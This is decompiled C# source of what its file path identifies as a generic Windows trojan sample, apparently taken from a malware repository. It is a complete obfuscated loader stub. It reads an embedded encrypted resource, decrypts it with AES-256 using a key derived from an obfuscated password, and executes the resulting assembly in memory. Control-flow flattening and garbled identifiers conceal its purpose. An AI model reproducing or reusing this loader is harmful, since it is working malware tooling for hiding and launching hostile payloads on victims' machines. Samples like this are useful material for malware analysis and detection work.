// Decompiled with JetBrains decompiler
// Type: ﷑
// Assembly: server1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9CD269B0-F716-4FDF-9F62-CFD9D3EBCEC1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-1fcd818dba1462ad6ee9c7d1e85c949b102fe65835c8f4e69280b9c1f8d62beb.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

internal static class \uFDD1
{
  private static byte[] \uFDD0;

  public static byte[] \uFDD0(byte[] _param0, byte[] _param1)
  {
    byte[] numArray1 = (byte[]) null;
    byte[] numArray2;
    for (int index1 = 0; index1 == 0; index1 = 1)
    {
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        try
        {
          rijndaelManaged.KeySize = 256;
          int num = 0;
          Rfc2898DeriveBytes rfc2898DeriveBytes;
          while (true)
          {
            switch (num)
            {
              case 0:
                rijndaelManaged.BlockSize = 128;
                num = 1;
                continue;
              case 1:
                rfc2898DeriveBytes = new Rfc2898DeriveBytes(_param1, \uFDD1.\uFDD0, 1000);
                num = 2;
                continue;
              case 2:
                rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                num = 3;
                continue;
              case 3:
                rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                num = 4;
                continue;
              case 4:
                rijndaelManaged.Mode = CipherMode.CBC;
                num = 5;
                continue;
              case 5:
                CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
                try
                {
                  cryptoStream.Write(_param0, 0, _param0.Length);
                  for (int index2 = 0; index2 == 0; index2 = 1)
                    cryptoStream.Close();
                }
                finally
                {
                  bool flag = cryptoStream == null;
                  for (int index3 = 0; index3 == 0 && !flag; index3 = 1)
                    cryptoStream.Dispose();
                }
                numArray1 = memoryStream.ToArray();
                num = 6;
                continue;
              default:
                goto label_28;
            }
          }
        }
        finally
        {
          bool flag = rijndaelManaged == null;
          for (int index4 = 0; index4 == 0 && !flag; index4 = 1)
            rijndaelManaged.Dispose();
        }
      }
      finally
      {
        bool flag = memoryStream == null;
        for (int index5 = 0; index5 == 0 && !flag; index5 = 1)
          memoryStream.Dispose();
      }
label_28:
      numArray2 = numArray1;
    }
    return numArray2;
  }

  [STAThread]
  private static void \uFDD0()
  {
    Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(\uFDD3.\uFDD0("铞ퟠꃢꓤퟦ\uDBE8꣪곬", 4));
    try
    {
      bool flag = manifestResourceStream != null;
      int num = 0;
      byte[] numArray;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (flag)
            {
              numArray = new byte[manifestResourceStream.Length];
              num = 1;
              continue;
            }
            goto label_8;
          case 1:
            manifestResourceStream.Read(numArray, 0, numArray.Length);
            num = 2;
            continue;
          case 2:
            numArray = \uFDD1.\uFDD0(numArray, Encoding.Default.GetBytes(\uFDD3.\uFDD0("裞럠ꧢ뗤탦\uDBE8ꇪ꿬뿮ꃰꓲ쏴꛶럸럺췼듾㜀㨂嘄䈆䘈上唌㜎⌐帒伔外團⨚嬜伞ᔠᐢ猤ἦ焨縪ᴬ", 4)));
            num = 3;
            continue;
          case 3:
            Assembly.Load(numArray).EntryPoint.Invoke((object) null, (object[]) null);
            num = 4;
            continue;
          default:
            goto label_13;
        }
      }
label_8:
      return;
    }
    finally
    {
      bool flag = manifestResourceStream == null;
      for (int index = 0; index == 0 && !flag; index = 1)
        manifestResourceStream.Dispose();
    }
label_13:;
  }

  static \uFDD1()
  {
    byte[] numArray = new byte[8];
    for (int index = 0; index == 0; index = 1)
      \uFDD1.\uFDD0 = numArray;
  }
}
